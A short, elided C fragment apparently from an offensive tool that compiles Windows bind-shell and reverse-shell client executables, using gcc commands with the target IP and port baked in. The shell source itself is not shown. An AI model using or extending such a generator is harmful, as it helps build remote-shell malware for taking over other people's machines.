...
void createShellExecutable(struct Shell shell) {
    ...
    if (shell.type == 0){
        ...
        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/bindclient.exe clients/bindshell_client.c -lws2_32", shell.port, shell.ip);
    }
        ...
        printf("Creating client...\n");
        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/reverseclient.exe clients/reverseshell_client.c -lws2_32", shell.port, shell.ip);
